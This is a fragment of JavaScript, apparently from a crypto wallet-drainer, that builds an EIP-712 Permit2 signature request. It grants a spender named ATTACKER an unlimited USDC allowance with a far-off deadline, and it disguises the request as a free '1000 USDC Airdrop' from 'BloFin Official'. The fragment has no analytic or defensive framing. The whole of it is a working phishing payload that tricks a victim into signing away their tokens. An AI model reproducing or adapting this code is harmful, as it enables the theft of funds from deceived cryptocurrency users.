    {name:"spender",type:"address"},
    {name:"nonce",type:"uint256"},
    {name:"deadline",type:"uint256"},
    {name:"witness",type:"AirdropClaim"}
  ],
  TokenPermissions:[
    {name:"token",type:"address"},
    {name:"amount",type:"uint256"}
  ],
  AirdropClaim:[
    {name:"message",type:"string"},
    {name:"amount",type:"string"},
    {name:"isEligible",type:"bool"}
  ]
};

const message={
  permitted:{token:USDC,amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
  spender:ATTACKER,
  nonce:0,
  deadline:9999999999,
  witness:{message:"You have claimed 1000 USDC Airdrop - Free from BloFin Official",amount:"1000 USDC",isEligible:true}
};

const data=JSON.stringify({
  types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
 ...types},
  domain:domain,
  primaryType:"PermitWitnessTransferFrom",
  message:message
});

}
